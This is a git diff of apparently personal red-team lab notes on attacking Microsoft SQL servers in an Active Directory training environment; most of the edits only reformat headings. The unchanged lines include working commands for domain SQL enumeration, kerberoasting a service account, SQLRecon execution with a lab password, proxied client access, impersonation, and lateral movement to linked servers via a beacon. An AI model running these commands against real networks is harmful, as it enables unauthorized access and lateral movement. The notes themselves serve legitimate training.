@@ -4,7 +4,7 @@ Tools:
 [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) 
 [SQLRecon](https://github.com/skahwah/SQLRecon) [wiki](https://github.com/skahwah/SQLRecon/wiki/)
 
-enum
+## Enum
 ```
 powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
 powershell Get-SQLInstanceDomain
@@ -25,14 +25,14 @@ find any users with access
 powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }
 ```
 
-**attack sql account itself**
+## attack sql account itself
 
 so if we have a ms sql server account we can try kerberoasting it then use beacons make_token with the cracked password, then run this to abuse
 ```
 execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:windomain /d:dev.cyberbotic.io /u:mssql_svc /p:Cyberb0tic /h:sql-2.dev.cyberbotic.io,1433 /m:whoami
 ```
 
-**with access**
+## with access
 
 querying
 ```
@@ -45,7 +45,7 @@ proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25
 or use proxifier with a sql gui
 ```
 
-**MS SQL Impersonation**
+## MS SQL Impersonation
 
 allows the executing user to assume the permissions of another user without needing their password
 
@@ -152,7 +152,7 @@ query this with lwhoami for sqlrecon:
 execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lwhoami /l:sql-1.cyberbotic.io
 ```
 
-**get beacon on new link**
+## get beacon on new link
 
 keep in mind that the new link my only be able to talk to the new sql server we already popped, so keep that in mind to set up the port forward for traffic. CS will double hop it over so don't worry about setting up the forward to a different one just do so like below in the beacon that can talk to the link.
 
